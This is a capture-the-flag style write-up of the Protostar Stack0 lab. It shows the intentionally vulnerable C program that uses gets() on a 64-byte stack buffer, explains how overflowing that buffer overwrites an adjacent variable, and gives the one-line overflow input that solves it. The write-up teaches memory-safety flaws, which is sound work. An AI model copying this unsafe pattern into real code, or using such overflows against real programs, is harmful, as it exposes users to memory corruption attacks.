# Stack0 

# Description 

>This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.

# Source Code 

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```
From the source code, we can see the main function has an integer variable called `modified` with value 0 and a buffer with 64 byte length.

It uses `gets` to write our input to that buffer, gets is dangerous because it doesn't check the input size.

So if we write more than 64 byte to that buffer, it will start overwriting the modifierd variable value.

# Solution 
```
user@protostar:/opt/protostar/bin$ python -c 'print "A"*64 +"BBBB" ' | ./stack0
you have changed the 'modified' variable

```
